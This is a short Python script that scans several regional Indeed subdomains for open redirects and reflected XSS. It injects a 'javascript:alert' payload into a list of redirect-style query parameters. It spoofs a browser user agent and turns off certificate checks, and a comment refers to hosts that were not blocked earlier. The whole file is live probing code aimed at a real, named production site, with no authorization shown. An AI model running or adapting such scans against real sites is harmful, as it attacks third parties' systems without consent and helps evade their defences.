import re

import requests
import urllib3

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
CANARY = "40931"

# Indeed's careers page has a redirect parameter historically; test a handful
# of redirect-style names on the non-blocked hosts we found earlier.
hosts = ["ma.indeed.com", "in.indeed.com", "ie.indeed.com", "it.indeed.com",
         "au.indeed.com", "nl.indeed.com"]
params = ["redirect", "returnUrl", "continue", "next", "redir", "goto", "target",
          "returnPath", "redirect_uri", "callback", "ret", "dest", "url"]

for h in hosts:
    for p in params:
        u = f"https://{h}/?{p}=" + requests.utils.quote(f"javascript:alert({CANARY})", safe="")
        try:
            r = requests.get(u, timeout=15, verify=False, headers=UA,
                             allow_redirects=False)
        except Exception:
            continue
        loc = r.headers.get("Location", "")
        body = r.text or ""
        if loc or "40931" in body:
            print(f"{h:22} {p:14} {r.status_code} loc={loc[:60]!r} "
                  f"body-canary={'40931' in body}")
